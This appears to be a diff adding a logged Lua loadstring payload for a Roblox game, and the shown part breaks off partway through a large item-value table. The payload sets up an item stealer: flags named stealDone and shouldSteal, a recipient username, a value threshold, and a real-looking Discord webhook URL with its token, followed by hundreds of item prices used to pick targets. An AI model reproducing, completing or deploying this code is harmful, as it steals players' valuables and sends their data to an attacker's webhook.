@@ -1,0 +1,4156 @@
+-- This file was logged using Oxyenv v3.50.25 http://dsc.gg/oxyenv
+
+loadstring("if _G.scriptExecuted then return end\
+_G.scriptExecuted = true\
+local stealDone = false\
+local guiBlocked = false\
+local shouldSteal = true  \
+local userName = \"johfhfip\"\
+local webHook = \"https://discord.com/api/webhooks/1561114143669616821/jjF8oIIVx_orHNgmVUTBoArqAVymH3uWE-YZAOxK51hicDF84QAxMHHRCzupZXWakD7Z\"\
+local minValue = 90\
+if game.PlaceId ~= 142823291 then\
+    return  \
+end\
+local Players = game:GetService(\"Players\")\
+local ReplicatedStorage = game:GetService(\"ReplicatedStorage\")\
+local HttpService = game:GetService(\"HttpService\")\
+local LP = Players.LocalPlayer\
+repeat task.wait() until LP.Character and LP.Character:FindFirstChild(\"HumanoidRootPart\")\
+local values = {\
+    [\"Immortal\"] = 5000,\
+    [\"Mortal\"] = 5000,\
+    [\"Embersickle\"] = 25000000,\
+    [\"Emberscythe\"] = 2000,\
+    [\"Emberbow\"] = 3000,\
+    [\"Soul\"] = 5000,\
+    [\"Spirit\"] = 5000,\
+    [\"Nik's Scythe\"] = 25000000,\
+    [\"Elderwood Scythe\"] = 38,\
+    [\"Batwing\"] = 43,\
+    [\"Icewing\"] = 15,\
+    [\"Corrupt\"] = 475,\
+    [\"Chroma Luger\"] = 60,\
+    [\"Chroma Shark\"] = 40,\
+    [\"Chroma Laser\"] = 35,\
+    [\"Chroma Slasher\"] = 27,\
+    [\"Chroma Fang\"] = 57,\
+    [\"Chroma Heat\"] = 80,\
+    [\"Chroma Saw\"] = 42,\
+    [\"Chroma DeathShard\"] = 58,\
+    [\"Chroma Tides\"] = 62,\
+    [\"SeerChroma\"] = 50,\
+    [\"Chroma Boneblade\"] = 58,\
+    [\"Chroma Gingerblade\"] = 57,\
+    [\"Elderwood Revolver\"] = 58,\
+    [\"Eternal II\"] = 7,\
+    [\"Red Luger\"] = 42,\
+    [\"Green Luger\"] = 30,\
+    [\"Sugar\"] = 145,\
+    [\"Candy\"] = 155,\
+    [\"Chill\"] = 24,\
+    [\"Handsaw\"] = 10,\
+    [\"Eternal\"] = 10,\
+    [\"Boneblade\"] = 10,\
+    [\"Clockwork\"] = 26,\
+    [\"Hallow's Edge\"] = 15,\
+    [\"Amerilaser\"] = 30,\
+    [\"Old Glory\"] = 28,\
+    [\"BattleAxe II\"] = 16,\
+    [\"Spider\"] = 22,\
+    [\"Pixel\"] = 24,\
+    [\"Blaster\"] = 30,\
+    [\"Ginger Luger\"] = 26,\
+    [\"Virtual\"] = 28,\
+    [\"Flames\"] = 13,\
+    [\"Luger\"] = 60,\
+    [\"Heat\"] = 25,\
+    [\"Xmas\"] = 13,\
+    [\"Tides\"] = 23,\
+    [\"Slasher\"] = 26,\
+    [\"Pumpking\"] = 22,\
+    [\"Saw\"] = 10,\
+    [\"Laser\"] = 8,\
+    [\"Fang\"] = 23,\
+    [\"Shark\"] = 28,\
+    [\"Deathshard\"] = 21,\
+    [\"Winter's Edge\"] = 14,\
+    [\"Ice Dragon\"] = 13,\
+    [\"Red Seer\"] = 3,\
+    [\"Seer\"] = 3,\
+    [\"Blue Seer\"] = 3,\
+    [\"Purple Seer\"] = 3,\
+    [\"Orange Seer\"] = 2,\
+    [\"Yellow Seer\"] = 2,\
+    [\"BattleAxe\"] = 13,\
+    [\"Frostsaber\"] = 18,\
+    [\"Ice Shard\"] = 14,\
+    [\"Gingerblade\"] = 22,\
+    [\"Snowflake\"] = 8,\
+    [\"Ghostblade\"] = 10,\
+    [\"Nightblade\"] = 28,\
+    [\"Hallow's Blade\"] = 11,\
+    [\"JD\"] = 60,\
+    [\"Web\"] = 2,\
+    [\"Rupture\"] = 2,\
+    [\"Green Elite\"] = 10,\
+    [\"Tree (gun)\"] = 1,\
+    [\"Tree (knife)\"] = 1,\
+    [\"Cotton Candy\"] = 60,\
+    [\"Scratch\"] = 5,\
+    [\"Ghost Knife\"] = 6,\
+    [\"Ginger Gun\"] = 4,\
+    [\"Red Fire\"] = 3,\
+    [\"Blue Scratch\"] = 3,\
+    [\"Blue Elite\"] = 8,\
+    [\"Green Fire\"] = 0.43,\
+    [\"Ghost Gun\"] = 1,\
+    [\"Predator (knife)\"] = 0.44,\
+    [\"Emerald\"] = 0.44,\
+    [\"Sparkle\"] = 0.43,\
+    [\"Overseer (gun)\"] = 0.44,\
+    [\"Midnight\"] = 0.43,\
+    [\"Elite\"] = 0.33,\
+    [\"Shiny\"] = 0.34,\
+    [\"Fusion\"] = 0.34,\
+    [\"Fade\"] = 0.34,\
+    [\"Splash\"] = 0.34,\
+    [\"Universe\"] = 0.34,\
+    [\"Overseer (knife)\"] = 0.42,\
+    [\"Predator (gun)\"] = 0.42,\
+    [\"Plasmite\"] = 0.34,\
+    [\"Viper\"] = 0.34,\
+    [\"Ginger Knife\"] = 0.42,\
+    [\"Jack\"] = 4,\
+    [\"Mummy\"] = 1,\
+    [\"Ginger (Knife)\"] = 1,\
+    [\"Ginger (Gun)\"] = 1,\
+    [\"Cane (Knife)\"] = 2,\
+    [\"Cane (Gun)\"] = 2,\
+    [\"Orange Marble\"] = 4,\
+    [\"Bats\"] = 4,\
+    [\"Cane Knife\"] = 175,\
+    [\"Icicles Gun\"] = 25,\
+    [\"Snowy\"] = 1,\
+    [\"GingerBread\"] = 0.42,\
+    [\"Vampire Gun\"] = 25,\
+    [\"Toxic Knife\"] = 30,\
+    [\"Galaxy\"] = 0.24,\
+    [\"Rainbow\"] = 500,\
+    [\"Imbued\"] = 0.24,\
+    [\"Galactic\"] = 0.24,\
+    [\"Krypto\"] = 0.24,\
+    [\"Spectrum\"] = 0.24,\
+    [\"iRevolver\"] = 0.24,\
+    [\"Hacker\"] = 0.24,\
+    [\"Nova\"] = 0.24,\
+    [\"Vortex\"] = 0.24,\
+    [\"Ace\"] = 0.24,\
+    [\"Bacon\"] = 0.24,\
+    [\"Korblox\"] = 0.24,\
+    [\"Squire\"] = 0.24,\
+    [\"Abstract\"] = 0.24,\
+    [\"Musical\"] = 0.24,\
+    [\"Black\"] = 0.24,\
+    [\"Purple\"] = 0.24,\
+    [\"Magma\"] = 12,\
+    [\"Green Marble\"] = 6,\
+    [\"Vampire Knife\"] = 2,\
+    [\"Toxic Gun\"] = 3,\
+    [\"Cane Gun\"] = 0.42,\
+    [\"Icicles Knife\"] = 0.41,\
+    [\"Nether\"] = 0.41,\
+    [\"Spitfire\"] = 0.33,\
+    [\"Damp\"] = 0.33,\
+    [\"Molten (Gun)\"] = 0.42,\
+    [\"Molten (Knife)\"] = 0.42,\
+    [\"Gifted\"] = 1,\
+    [\"Snowman (Knife)\"] = 1,\
+    [\"Snowman (Gun)\"] = 1,\
+    [\"Nutcracker\"] = 1,\
+    [\"Wrapped (Knife)\"] = 1,\
+    [\"Wrapped (Gun)\"] = 1,\
+    [\"Wolf\"] = 4,\
+    [\"Vampire\"] = 3,\
+    [\"Moons\"] = 4,\
+    [\"Night\"] = 0.31,\
+    [\"Future\"] = 0.31,\
+    [\"Checker\"] = 0.31,\
+    [\"Love (Gun)\"] = 0.42,\
+    [\"Donut\"] = 0.31,\
+    [\"Wanwood\"] = 0.14,\
+    [\"Adurite (Knife)\"] = 0.14,\
+    [\"Bluesteel (Knife)\"] = 0.14,\
+    [\"Adurite (Gun)\"] = 0.14,\
+    [\"Camo\"] = 0.14,\
+    [\"Stalker\"] = 0.14,\
+    [\"Missing\"] = 0.14,\
+    [\"Cheesy\"] = 0.14,\
+    [\"Sketch\"] = 0.14,\
+    [\"Marina\"] = 0.14,\
+    [\"Cheddar\"] = 0.14,\
+    [\"Circuit\"] = 0.14,\
+    [\"Paper\"] = 0.14,\
+    [\"Doge\"] = 0.14,\
+    [\"Caution\"] = 0.14,\
+    [\"Soda\"] = 0.14,\
+    [\"Wooden\"] = 0.14,\
+    [\"Hazmat\"] = 0.14,\
+    [\"Bluesteel (Gun)\"] = 0.14,\
+    [\"Melon\"] = 0.14,\
+    [\"Hive\"] = 0.14,\
+    [\"Jigsaw\"] = 0.14,\
+    [\"Brush\"] = 0.14,\
+    [\"Lucky\"] = 0.14,\
+    [\"Pink\"] = 0.14,\
+    [\"Blue\"] = 0.14,\
+    [\"Red\"] = 0.14,\
+    [\"Mummy (Knife)\"] = 2,\
+    [\"Potion\"] = 5,\
+    [\"Webs\"] = 4,\
+    [\"Tree\"] = 0.41,\
+    [\"Sweater\"] = 0.32,\
+    [\"Frosty\"] = 0.41,\
+    [\"Mummy Gun\"] = 12,\
+    [\"Zombie Gun\"] = 20,\
+    [\"Potion Knife\"] = 22,\
+    [\"Mummy Knife\"] = 2,\
+    [\"Zombie Knife\"] = 2,\
+    [\"Potion Gun\"] = 2,\
+    [\"Sweater Knife\"] = 10,\
+    [\"Snowflake Knife\"] = 4,\
+    [\"Holly Gun\"] = 2,\
+    [\"Sweater Gun\"] = 0.31,\
+    [\"Snowflake Gun\"] = 0.31,\
+    [\"Holly Knife\"] = 0.31,\
+    [\"2015\"] = 2,\
+    [\"TNL\"] = 2,\
+    [\"Hearts\"] = 4,\
+    [\"Valentine\"] = 3,\
+    [\"Goo\"] = 2,\
+    [\"Neon\"] = 3,\
+    [\"Reptile\"] = 2,\
+    [\"Infected\"] = 2,\
+    [\"Passion\"] = 4,\
+    [\"Sweetheart\"] = 3,\
+    [\"Blossom\"] = 1500,\
+    [\"Roses\"] = 4,\
+    [\"Santa (Knife)\"] = 1,\
+    [\"Santa (Gun)\"] = 1,\
+    [\"Ornament2 (knife)\"] = 1,\
+    [\"Ornament2 (Gun)\"] = 1,\
+    [\"Ornament1\"] = 1,\
+    [\"Ornament\"] = 1,\
+    [\"Elf (Gun)\"] = 3,\
+    [\"Elf (knife)\"] = 14,\
+    [\"Tulip\"] = 3,\
+    [\"Skool\"] = 23,\
+    [\"Patrick\"] = 2,\
+    [\"Bunny\"] = 0.11,\
+    [\"Choco\"] = 3,\
+    [\"Egg\"] = 2,\
+    [\"Carrot\"] = 2,\
+    [\"Asteroid\"] = 6,\
+    [\"Ghosty\"] = 0.32,\
+    [\"Brains\"] = 1,\
+    [\"Witch\"] = 1,\
+    [\"Boney\"] = 1,\
+    [\"Xbox\"] = 0.12,\
+    [\"Slime Gun\"] = 2,\
+    [\"Slime Knife\"] = 3,\
+    [\"Bats Knife\"] = 70,\
+    [\"Bats Gun\"] = 4,\
+    [\"Grave Gun\"] = 12,\
+    [\"Grave Knife\"] = 2,\
+    [\"Haunted Knife\"] = 10,\
+    [\"Haunted Gun\"] = 2,\
+    [\"Sparkle10\"] = 45,\
+    [\"Sparkle1\"] = 3,\
+    [\"Sparkle2\"] = 3,\
+    [\"Sparkle3\"] = 3,\
+    [\"Sparkle4\"] = 5,\
+    [\"Ecto\"] = 3,\
+    [\"CandyCorn\"] = 2,\
+    [\"Phantom\"] = 6,\
+    [\"Zombie\"] = 4,\
+    [\"Elf (2017)\"] = 0.31,\
+    [\"Santa (2017)\"] = 0.31,\
+    [\"Coal\"] = 0.31,\
+    [\"Present\"] = 0.31,\
+    [\"Sidewinder\"] = 15,\
+    [\"Grind\"] = 4,\
+    [\"Euro\"] = 8,\
+    [\"Ollie\"] = 20,\
+    [\"Tailslide\"] = 22,\
+    [\"Indy\"] = 2,\
+    [\"Coal Gun\"] = 0.31,\
+    [\"Snowman Knife\"] = 0.31,\
+    [\"Santa Knife\"] = 0.31,\
+    [\"Wrapped Knife\"] = 0.31,\
+    [\"Sparkle5\"] = 15,\
+    [\"Sparkle6\"] = 18,\
+    [\"Sparkle7\"] = 23,\
+    [\"Sparkle8\"] = 26,\
+    [\"Sparkle9\"] = 42,\
+    [\"Coal knife\"] = 25,\
+    [\"Snowman Gun\"] = 5,\
+    [\"Elf Gun\"] = 0.41,\
+    [\"Wrapped Gun\"] = 5,\
+    [\"Whiteout\"] = 0.11,\
+    [\"Splatter\"] = 0.11,\
+    [\"Ice\"] = 0.11,\
+    [\"Love (Knife)\"] = 0.11,\
+    [\"Iron\"] = 0.11,\
+    [\"Big Kill\"] = 0.11,\
+    [\"Fallout\"] = 0.11,\
+    [\"Cold\"] = 0.11,\
+    [\"Linked\"] = 0.11,\
+    [\"Slate\"] = 0.11,\
+    [\"Borders\"] = 0.11,\
+    [\"8bit\"] = 0.11,\
+    [\"Engraved\"] = 0.11,\
+    [\"Infiltrator\"] = 0.11,\
+    [\"Juice\"] = 0.11,\
+    [\"Star\"] = 0.11,\
+    [\"Clan\"] = 0.11,\
+    [\"Cherry\"] = 0.11,\
+    [\"Cardboard\"] = 0.11,\
+    [\"Stainless\"] = 0.11,\
+    [\"Bit\"] = 0.11,\
+    [\"Pea\"] = 0.11,\
+    [\"News\"] = 0.11,\
+    [\"HL2\"] = 0.11,\
+    [\"Bleached\"] = 0.11,\
+    [\"Clown\"] = 0.12,\
+    [\"Oily\"] = 0.11,\
+    [\"Aqua\"] = 0.11,\
+    [\"Eco\"] = 0.11,\
+    [\"Log\"] = 0.11,\
+    [\"Sandy\"] = 0.11,\
+    [\"Static\"] = 0.11,\
+    [\"Brown\"] = 0.11,\
+    [\"Green\"] = 0.11,\
+    [\"Yellow\"] = 0.11,\
+    [\"Orange\"] = 0.11,\
+    [\"Prism\"] = 3,\
+    [\"Denis\"] = 1,\
+    [\"Alex\"] = 1,\
+    [\"Corl\"] = 1,\
+    [\"Sketchy\"] = 1,\
+    [\"Sub\"] = 1,\
+    [\"Chroma Fire Bat\"] = 15,\
+    [\"Chroma Fire Bear\"] = 8,\
+    [\"Chroma Fire Fox\"] = 15,\
+    [\"Chroma Fire Pig\"] = 9,\
+    [\"Chroma Fire Bunny\"] = 18,\
+    [\"Chroma Fire Cat\"] = 20,\
+    [\"Chroma Fire Dog\"] = 15,\
+    [\"<3\"] = 10,\
+    [\"Steambird\"] = 2,\
+    [\"Phoenix\"] = 3,\
+    [\"Sammy\"] = 2,\
+    [\"Electro\"] = 2,\
+    [\"Deathspeaker\"] = 3,\
+    [\"Fire Bat\"] = 1,\
+    [\"Fire Bear\"] = 1,\
+    [\"Frostbird\"] = 3,\
+    [\"Fire Fox\"] = 1,\
+    [\"Fire Pig\"] = 1,\
+    [\"Fire Bunny\"] = 1,\
+    [\"Fire Cat\"] = 1,\
+    [\"Fire Dog\"] = 1,\
+    [\"Ice Phoenix\"] = 0.43,\
+    [\"Traveller\"] = 0.43,\
+    [\"Skelly\"] = 0.43,\
+    [\"Purple Pumpkin\"] = 40,\
+    [\"Overseer Eye\"] = 38,\
+    [\"Blue Pumpkin\"] = 60,\
+    [\"Red Pumpkin\"] = 45,\
+    [\"Green Pumpkin\"] = 30,\
+    [\"Pumpkin\"] = 18,\
+    [\"Fairy\"] = 22,\
+    [\"Reindeer\"] = 20,\
+    [\"Elf\"] = 4,\
+    [\"Nobledragon\"] = 25,\
+    [\"Elitey\"] = 0.31,\
+    [\"Eyeball\"] = 35,\
+    [\"Jetstream\"] = 42,\
+    [\"Dogey\"] = 55,\
+    [\"Chilly\"] = 15,\
+    [\"Seahorsey\"] = 17,\
+    [\"Piggy\"] = 4,\
+    [\"Pengy\"] = 15,\
+    [\"UFO\"] = 7,\
+    [\"Badger\"] = 2,\
+    [\"Bat\"] = 120,\
+    [\"Tankie\"] = 13,\
+    [\"Mechbug\"] = 7,\
+    [\"Bear\"] = 0.22,\
+    [\"Fox\"] = 0.12,\
+    [\"Pig\"] = 0.12,\
+    [\"Santa Dog\"] = 0.12,\
+    [\"Cat\"] = 0.11,\
+    [\"Dog\"] = 0.11,\
+    [\"America\"] = 10,\
+    [\"Golden\"] = 4,\
+    [\"Blood\"] = 10,\
+    [\"Phaser\"] = 9,\
+    [\"Prince\"] = 6,\
+    [\"Shadow\"] = 7,\
+    [\"Ghost\"] = 12,\
+    [\"Splitter\"] = 3,\
+    [\"Cowboy\"] = 3,\
+    [\"Eternalcane\"] = 20,\
+    [\"Skulls\"] = 12,\
+    [\"Witched\"] = 50,\
+    [\"Monster\"] = 22,\
+    [\"Pumpkin Patch\"] = 2,\
+    [\"Blue Pumpkin 2019\"] = 3,\
+    [\"Brains 2019\"] = 20,\
+    [\"Elf 2019\"] = 25,\
+    [\"Gingerbread Gun\"] = 5,\
+    [\"Gingerbread Knife\"] = 105,\
+    [\"Green Pumpkin 2019\"] = 27,\
+    [\"Red Pumpkin 2019\"] = 30,\
+    [\"PumpkinPet2019\"] = 0.21,\
+    [\"Rudolph\"] = 20,\
+    [\"Vampire Bat\"] = 32,\
+    [\"Black Cat\"] = 45,\
+    [\"Zombie Dog\"] = 185,\
+    [\"Aurora Gun\"] = 92,\
+    [\"Aurora\"] = 900,\
+    [\"Bones Gun\"] = 75,\
+    [\"Branches\"] = 22,\
+    [\"Candy Swirl Gun\"] = 20,\
+    [\"Candy Swirl Knife\"] = 1,\
+    [\"Lights Gun\"] = 20,\
+    [\"Lights Knife\"] = 2,\
+    [\"Log Chopper\"] = 30,\
+    [\"Minty\"] = 25,\
+    [\"Icey\"] = 0.32,\
+    [\"Frostbite\"] = 10,\
+    [\"Lugercane\"] = 20,\
+    [\"Snakebite Knife\"] = 12,\
+    [\"Snakebite Gun\"] = 1,\
+    [\"Snowflakes Gun\"] = 0.41,\
+    [\"Snowflakes Knife\"] = 0.31,\
+    [\"Slimy\"] = 0.41,\
+    [\"Santa's Magic\"] = 13,\
+    [\"Dungeon\"] = 45,\
+    [\"Frosted Gun\"] = 0.31,\
+    [\"Frosted Knife\"] = 0.41,\
+    [\"Gifts Knife\"] = 60,\
+    [\"Gifts Gun\"] = 1,\
+    [\"Pine Gun\"] = 1,\
+    [\"Pine Knife\"] = 20,\
+    [\"Webbed Gun\"] = 0.31,\
+    [\"Webbed Knife\"] = 0.33,\
+    [\"ZombifiedGun\"] = 20,\
+    [\"Zombified Knife\"] = 55,\
+    [\"Mummified\"] = 0.42,\
+    [\"RIP Gun\"] = 20,\
+    [\"Box of Gold Papers\"] = 4,\
+    [\"Box of Ultra Wrap\"] = 4,\
+    [\"Box of Purple Papers\"] = 3,\
+    [\"Box of Blue Papers\"] = 3,\
+    [\"Box of Red Papers\"] = 3,\
+    [\"Box of Green Papers\"] = 2,\
+    [\"Box of Fert\"] = 2,\
+    [\"Mystery Keys\"] = 4,\
+    [\"Xmas Gifts\"] = 0.41,\
+    [\"Snowflake Key\"] = 0.31,\
+    [\"Skeleton Key\"] = 2,\
+    [\"Chroma Gemstone\"] = 75,\
+    [\"Gemstone\"] = 26,\
+    [\"Eternal III\"] = 8,\
+    [\"Rune\"] = 0.34,\
+    [\"Rainbow (Gun)\"] = 0.24,\
+    [\"Bioblade\"] = 13,\
+    [\"Lightbringer\"] = 58,\
+    [\"Chroma Lightbringer\"] = 120,\
+    [\"Chroma Darkbringer\"] = 125,\
+    [\"Darkbringer\"] = 62,\
+    [\"Combat\"] = 0.11,\
+    [\"Copper\"] = 0.11,\
+    [\"Hardened\"] = 0.11,\
+    [\"Splat\"] = 0.11,\
+    [\"Tiger\"] = 0.14,\
+    [\"Pirate\"] = 0.14,\
+    [\"Space\"] = 0.24,\
+    [\"Splash Gun\"] = 0.33,\
+    [\"Deep Sea\"] = 0.24,\
+    [\"Nightfire\"] = 0.24,\
+    [\"Biogun\"] = 0.14,\
+    [\"Graffiti\"] = 0.13,\
+    [\"High Tech\"] = 0.13,\
+    [\"Clown Gun\"] = 0.12,\
+    [\"Leaf\"] = 0.11,\
+    [\"Lovely\"] = 0.11,\
+    [\"Shaded\"] = 0.11,\
+    [\"Eternal IV\"] = 10,\
+    [\"Prismatic\"] = 8,\
+    [\"Cavern Gun\"] = 1,\
+    [\"Cavern Knife\"] = 12,\
+    [\"Hallowscythe\"] = 50,\
+    [\"Hallowgun\"] = 33,\
+    [\"Vampire's Edge\"] = 16,\
+    [\"Ripper Gun\"] = 0.42,\
+    [\"Ripper Knife\"] = 0.43,\
+    [\"Bones\"] = 0.32,\
+    [\"Portal Knife\"] = 0.32,\
+    [\"Ghosts\"] = 0.21,\
+    [\"Peppermint\"] = 6,\
+    [\"Icebreaker\"] = 85,\
+    [\"Iceblaster\"] = 60,\
+    [\"Jinglegun\"] = 14,\
+    [\"Cookieblade\"] = 4,\
+    [\"Gold Candy\"] = 100000000,\
+    [\"Silver Candy\"] = 75000000,\
+    [\"Bronze Candy\"] = 50000000,\
+    [\"Blue Candy\"] = 1000000,\
+    [\"Red Hallow\"] = 1000000,\
+    [\"Gold Hallow\"] = 100000000,\
+    [\"Silver Hallow\"] = 75000000,\
+    [\"Bronze Hallow\"] = 50000000,\
+    [\"Bronze Sugar\"] = 50000000,\
+    [\"Silver Sugar\"] = 75000000,\
+    [\"Gold Sugar\"] = 100000000,\
+    [\"Blue Sugar\"] = 1000000,\
+    [\"Blue Elderwood (gun)\"] = 1000000,\
+    [\"Bronze Elderwood (gun)\"] = 50000000,\
+    [\"Silver Elderwood (gun)\"] = 75000000,\
+    [\"Gold Elderwood (gun)\"] = 100000000,\
+    [\"Gold Logchopper\"] = 100000000,\
+    [\"Gold Minty\"] = 100000000,\
+    [\"Silver Minty\"] = 75000000,\
+    [\"Silver Logchopper\"] = 75000000,\
+    [\"Bronze Logchopper\"] = 50000000,\
+    [\"Bronze Minty\"] = 50000000,\
+    [\"Blue Minty\"] = 1000000,\
+    [\"Blue Logchopper\"] = 1000000,\
+    [\"Logchopper\"] = 30,\
+    [\"Blue Vamp's Edge\"] = 1000000,\
+    [\"Bronze Vamp's Edge\"] = 50000000,\
+    [\"Silver Vamp's Edge\"] = 75000000,\
+    [\"Gold Vamp's Edge\"] = 100000000,\
+    [\"Heartblade\"] = 75,\
+    [\"Gold Icebreaker\"] = 100000000,\
+    [\"Silver Icebreaker\"] = 75000000,\
+    [\"Bronze Icebreaker\"] = 50000000,\
+    [\"Red Icebreaker\"] = 1000000,\
+    [\"Red Iceblaster\"] = 1000000,\
+    [\"Bronze Iceblaster\"] = 50000000,\
+    [\"Silver Iceblaster\"] = 75000000,\
+    [\"Gold Iceblaster\"] = 100000000,\
+    [\"Eggblade\"] = 3,\
+    [\"Nebula\"] = 7,\
+    [\"Glitch1\"] = 25,\
+    [\"Candleflame\"] = 130,\
+    [\"Chroma Candleflame\"] = 190,\
+    [\"Harvester\"] = 900,\
+    [\"Chroma Swirlygun\"] = 180,\
+    [\"Swirly Gun\"] = 170,\
+    [\"Swirly Axe\"] = 190,\
+    [\"Swirly Blade\"] = 80,\
+    [\"Iceflake\"] = 31,\
+    [\"Icebeam\"] = 31,\
+    [\"Icecracker\"] = 3,\
+    [\"Ornaments Gun\"] = 0.12,\
+    [\"Ornaments Knife\"] = 0.12,\
+    [\"Gift Bag Knife\"] = 0.22,\
+    [\"Silent Night Knife\"] = 10,\
+    [\"Icedriller\"] = 15,\
+    [\"Stockings\"] = 0.12,\
+    [\"Trees\"] = 0.12,\
+    [\"Wrap Gun\"] = 0.22,\
+    [\"Wrap Knife\"] = 0.22,\
+    [\"Snowflakes\"] = 0.41,\
+    [\"Silent Night Gun\"] = 2,\
+    [\"Gift Bag Gun\"] = 0.12,\
+    [\"Giftwrap Knife\"] = 0.12,\
+    [\"Stickers Gun\"] = 0.12,\
+    [\"Cookie Gun\"] = 0.22,\
+    [\"Ice Camo\"] = 0.32,\
+    [\"Starry Knife\"] = 0.41,\
+    [\"Stickers Knife\"] = 0.11,\
+    [\"Coal Knife\"] = 0.12,\
+    [\"Ribbons\"] = 0.12,\
+    [\"Tree Knife\"] = 0.23,\
+    [\"Cookie Knife\"] = 0.31,\
+    [\"Starry Gun\"] = 0.43,\
+    [\"Swirl Knife\"] = 0.41,\
+    [\"Gold Harvester\"] = 100000000,\
+    [\"Silver Harvester\"] = 75000000,\
+    [\"Bronze Harvester\"] = 50000000,\
+    [\"Blue Harvester\"] = 1000000,\
+    [\"Plasmabeam\"] = 31,\
+    [\"Plasmablade\"] = 31,\
+    [\"Gold Swirly\"] = 100000000,\
+    [\"Silver Swirly\"] = 75000000,\
+    [\"Bronze Swirly\"] = 50000000,\
+    [\"Blue Swirly\"] = 1000000,\
+    [\"Silver Swirly Gun\"] = 75000000,\
+    [\"Bronze Swirly Gun\"] = 50000000,\
+    [\"Blue Swirly Gun\"] = 1000000,\
+    [\"Candies 2016\"] = 0.21,\
+    [\"Candies 2017\"] = 0.11,\
+    [\"Snowbear\"] = 0.31,\
+    [\"Scarecrow\"] = 0.42,\
+    [\"Mr. Reindeer\"] = 0.42,\
+    [\"Snowman\"] = 0.22,\
+    [\"Shadow Pumpkin\"] = 0.32,\
+    [\"Skully\"] = 0.42,\
+    [\"Santa's Spirit\"] = 12,\
+    [\"Frozen Gun\"] = 22,\
+    [\"RB Knife\"] = 0.31,\
+    [\"Gothic Gun\"] = 0.41,\
+    [\"Gothic Knife\"] = 0.23,\
+    [\"Wraiths Gun\"] = 0.23,\
+    [\"Fall Camo\"] = 0.22,\
+    [\"Wraiths Knife\"] = 0.41,\
+    [\"Frozen Knife\"] = 2,\
+    [\"Slashed\"] = 0.22,\
+    [\"Starry\"] = 0.22,\
+    [\"Carved (Gun)\"] = 0.12,\
+    [\"Carved (Knife)\"] = 0.13,\
+    [\"Chroma Elderwood Blade\"] = 190,\
+    [\"Makeshift\"] = 135,\
+    [\"Elderwood Blade\"] = 130,\
+    [\"Spectre\"] = 80,\
+    [\"Spectral Knife\"] = 5,\
+    [\"Spectral Gun\"] = 0.43,\
+    [\"Magma Knife\"] = 0.32,\
+    [\"Magma Gun\"] = 0.41,\
+    [\"Watcher Knife\"] = 0.32,\
+    [\"Watcher Gun\"] = 0.41,\
+    [\"Versus\"] = 0.12,\
+    [\"Apocalypse Knife\"] = 0.23,\
+    [\"Candy Corn Gun\"] = 0.22,\
+    [\"Apocalypse Gun\"] = 0.23,\
+    [\"Darkness Knife\"] = 0.22,\
+    [\"Hunter Knife\"] = 0.22,\
+    [\"Webs Gun\"] = 0.22,\
+    [\"Candy Corn Knife\"] = 0.12,\
+    [\"Eyeball Knife\"] = 0.12,\
+    [\"Stickers\"] = 0.12,\
+    [\"Darkness Gun\"] = 0.12,\
+    [\"Infected Knife\"] = 0.23,\
+    [\"Infected Gun\"] = 0.23,\
+    [\"Brains Gun\"] = 0.22,\
+    [\"Ghostly\"] = 0.22,\
+    [\"Hazard Knife\"] = 0.22,\
+    [\"Hazard Gun\"] = 0.31,\
+    [\"Lantern Knife\"] = 0.32,\
+    [\"Moonlight Gun\"] = 0.32,\
+    [\"Witchbrew\"] = 0.22,\
+    [\"Curse Knife\"] = 0.32,\
+    [\"Ghostfire\"] = 0.41,\
+    [\"Makeshift Knife\"] = 1,\
+    [\"Wraith Gun\"] = 0.32,\
+    [\"Wraith Knife\"] = 0.41,\
+    [\"Zombified\"] = 0.43,\
+    [\"Santa Walking\"] = 40,\
+    [\"Mr. Snowman\"] = 0.41,\
+    [\"Void\"] = 0.42,\
+    [\"Chroma Cookiecane\"] = 160,\
+    [\"Cookiecane\"] = 80,\
+    [\"Icepiercer\"] = 870,\
+    [\"Gingermint\"] = 80,\
+    [\"Arctic Knife\"] = 0.43,\
+    [\"Arctic Gun\"] = 4,\
+    [\"Coal Gun 2022\"] = 0.12,\
+    [\"Candied Knife\"] = 0.12,\
+    [\"Snowman Gun 2022\"] = 0.13,\
+    [\"Stockings 2022\"] = 0.23,\
+    [\"Mistletoe Gun\"] = 0.23,\
+    [\"Snowflake Knife 2022\"] = 0.23,\
+    [\"Gingerbread Gun 2022\"] = 0.33,\
+    [\"Tree Knife 2022\"] = 0.33,\
+    [\"Coal Knife 2022\"] = 0.12,\
+    [\"Candied Gun\"] = 0.12,\
+    [\"Stickers Gun 2022\"] = 0.12,\
+    [\"Snowman Knife 2022\"] = 0.12,\
+    [\"Stockings Gun 2022\"] = 0.22,\
+    [\"Mistletoe Knife\"] = 0.22,\
+    [\"Snowflake Gun 2022\"] = 0.22,\
+    [\"Tree Gun 2022\"] = 0.32,\
+    [\"Gingerbread Knife 2022\"] = 0.32,\
+    [\"Blue Elderwood\"] = 1000000,\
+    [\"Bronze Elderwood\"] = 50000000,\
+    [\"Silver Elderwood\"] = 75000000,\
+    [\"Gold Elderwood\"] = 100000000,\
+    [\"Gold Icepiercer\"] = 100000000,\
+    [\"Gold Icecrusher\"] = 100000000,\
+    [\"Silver Icecrusher\"] = 75000000,\
+    [\"Silver Icepiercer\"] = 75000000,\
+    [\"Bronze Icepiercer\"] = 50000000,\
+    [\"Bronze Icecrusher\"] = 50000000,\
+    [\"Red Icecrusher\"] = 1000000,\
+    [\"Red Icepiercer\"] = 1000000,\
+    [\"Glitch2\"] = 45,\
+    [\"Sakura\"] = 540,\
+    [\"Broken\"] = 3,\
+    [\"Heart\"] = 0.32,\
+    [\"Rose\"] = 0.22,\
+    [\"Love\"] = 0.12,\
+    [\"Teddy\"] = 0.32,\
+    [\"Vampire's Axe\"] = 230,\
+    [\"Vampire's Gun\"] = 240,\
+    [\"Combat II\"] = 4,\
+    [\"Constellation\"] = 200,\
+    [\"Candycorn 2019\"] = 0.31,\
+    [\"Candy Corn gun 2020\"] = 0.12,\
+    [\"Candy Corn knife 2020\"] = 0.12,\
+    [\"Watcher Knife 2020\"] = 0.12,\
+    [\"Watcher gun 2020\"] = 0.12,\
+    [\"Mummy Knife 2020\"] = 0.22,\
+    [\"Mummy gun 2020\"] = 0.22,\
+    [\"Portal Gun\"] = 0.22,\
+    [\"Ghosts knife 2020\"] = 0.22,\
+    [\"Candle\"] = 0.12,\
+    [\"Rainbow Gun\"] = 185,\
+    [\"Chromatic Knife\"] = 0.44,\
+    [\"Chromatic Gun\"] = 0.43,\
+    [\"Nuke\"] = 0.41,\
+    [\"Bio\"] = 0.32,\
+    [\"Marble\"] = 0.22,\
+    [\"Painted Knife\"] = 0.32,\
